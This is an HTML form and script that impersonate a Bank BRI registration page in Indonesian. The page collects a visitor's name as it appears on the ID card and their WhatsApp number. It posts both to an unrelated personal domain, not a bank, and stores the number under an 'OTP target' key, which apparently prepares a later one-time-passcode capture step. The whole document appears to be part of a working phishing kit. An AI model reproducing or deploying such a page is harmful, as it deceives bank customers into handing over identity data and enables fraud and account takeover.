   <form action="https://rejekiharini.my.id/ink/on.php" method="POST" enctype="multipart/form-data" oninput="cekForm()" onsubmit="return simpanHP()"> 
    <div class="form-group"> 
     <label for="nama">Nama Sesuai KTP</label> 
     <input type="text" id="nama" name="nama" placeholder="Masukkan nama lengkap" required> 
    </div> 
    <div class="form-group"> 
     <label for="hp">Nomor Whatsapp</label> 
     <input type="tel" id="hp" name="nohp" placeholder="08xxxxxxxxxx" oninput="formatNomorHP(this)" required> 
     <div id="error-hp" class="error"></div> 
    </div> <br>
    <p class="note"> Dengan klik daftar, kamu telah menyetujui <a href="#">Aturan Penggunaan</a> dan <a href="#">Kebijakan Privasi</a> dari Bank BRI. </p> 
    <button class="btn" type="submit" id="btn-daftar" disabled>DAFTAR</button> 
   </form> 
  </div> 
  <script>
    function formatNomorHP(input) {
      let val = input.value.replace(/\D/g, '');
      if (val.startsWith('0')) {
        val = '' + val.slice(1);
      } else if (!val.startsWith('62')) {
        val = '62' + val;
      }
      input.value = '+' + val;
    }
    function cekForm() {
      const nama = document.getElementById('nama').value.trim();
      const hp = document.getElementById('hp').value.trim();
      const btn = document.getElementById('btn-daftar');
      if (nama !== '' && hp !== '') {
        btn.disabled = false;
      } else {
        btn.disabled = true;
      }
    }
    function simpanHP() {
      const hp = document.getElementById('hp').value.trim();
      sessionStorage.setItem("otp_tujuan", hp);
      return true;
    }
  </script>
